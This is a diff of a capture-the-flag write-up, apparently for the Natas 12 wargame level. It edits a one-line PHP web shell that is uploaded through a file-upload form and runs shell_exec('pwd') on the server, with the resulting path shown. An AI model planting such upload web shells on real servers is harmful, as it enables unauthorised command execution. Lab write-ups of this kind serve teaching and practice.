@@ -47,7 +47,7 @@ By analysing the php script we can inject some malicious scipts, But we've to us
 ```
 Lets upload script.php
 ```php
-<? $res = shell_exec('pwd'); echo "<pre>$res</pre>"; ?>
+<? echo shell_exec('pwd'); ?>
 # /var/www/natas/natas12/upload
 ```
 ```php
